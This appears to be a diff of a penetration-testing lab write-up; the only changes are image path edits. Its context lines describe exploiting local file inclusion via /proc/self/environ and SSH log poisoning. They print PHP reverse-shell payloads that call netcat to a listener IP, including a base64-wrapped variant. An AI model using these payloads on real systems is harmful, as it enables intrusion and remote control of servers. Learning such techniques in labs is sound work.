@@ -148,7 +148,7 @@ If an attacker can control the session contents, PHP code may be injected into t
 
 After testing the application, we discovered that the page parameter was vulnerable to LFI.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260428164144.png)
+![](../../../Images/Pasted%20image%2020260428164144.png)
 
 We used:
 
@@ -166,7 +166,7 @@ For example:
 /etc/passwd
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260704220411.png)
+![](../../../Images/Pasted%20image%2020260704220411.png)
 
 Using this technique, we can read any file that the web server has permission to access.
 
@@ -184,7 +184,7 @@ First, we included:
 
 Then we intercepted the request using Burp Suite.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260704220614.png)
+![](../../../Images/Pasted%20image%2020260704220614.png)
 
 Inside the **User-Agent** header, we injected a simple PHP payload to verify whether PHP code would execute.
 
@@ -194,7 +194,7 @@ Inside the **User-Agent** header, we injected a simple PHP payload to verify whe
 
 After forwarding the request and including `/proc/self/environ` again, the `phpinfo()` page appeared.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260428210520.png)
+![](../../../Images/Pasted%20image%2020260428210520.png)
 
 This confirmed that PHP code inside the User-Agent was being executed.
 
@@ -204,15 +204,15 @@ Next, we replaced it with a Reverse Shell payload.
 <?php passthru("nc -e /bin/bash 192.168.227.128 4444"); ?>
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260428210641.png)
+![](../../../Images/Pasted%20image%2020260428210641.png)
 
 Before triggering the payload, we started a Netcat listener.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260704220838.png)
+![](../../../Images/Pasted%20image%2020260704220838.png)
 
 After requesting `/proc/self/environ` again, the payload executed and we received a Reverse Shell.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260704220902.png)
+![](../../../Images/Pasted%20image%2020260704220902.png)
 
 ---
 
@@ -232,11 +232,11 @@ Later, including the log file through the LFI vulnerability causes PHP to execut
 
 First, we viewed the log file.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429103504.png)
+![](../../../Images/Pasted%20image%2020260429103504.png)
 
 To verify that usernames were being logged, we attempted to log in using a random username.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429103612.png)
+![](../../../Images/Pasted%20image%2020260429103612.png)
 
 Next, we started a Netcat listener and replaced the SSH username with a PHP Reverse Shell payload.
 
@@ -244,13 +244,13 @@ Next, we started a Netcat listener and replaced the SSH username with a PHP Reve
 <?php passthru('nc -e /bin/bash IP PORT'); ?>
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429103735.png)
+![](../../../Images/Pasted%20image%2020260429103735.png)
 
 The payload contains spaces and special characters, which may prevent it from being stored correctly.
 
 To avoid this problem, we encoded the command using **Base64** with Burp Suite's Decoder.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429103916.png)
+![](../../../Images/Pasted%20image%2020260429103916.png)
 
 Then we modified the PHP payload to decode and execute the Base64 string.
 
@@ -258,11 +258,11 @@ Then we modified the PHP payload to decode and execute the Base64 string.
 <?php system(base64_decode("BASE64_PAYLOAD")); ?>
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429104050.png)
+![](../../../Images/Pasted%20image%2020260429104050.png)
 
 We attempted another SSH login using the payload as the username and any password so that it would be written into the log file.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429104147.png)
+![](../../../Images/Pasted%20image%2020260429104147.png)
 
 Finally, after including:
 
@@ -272,7 +272,7 @@ Finally, after including:
 
 through the LFI vulnerability, PHP executed our payload and we obtained a Reverse Shell.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260429104224.png)
+![](../../../Images/Pasted%20image%2020260429104224.png)
 
 ---
 
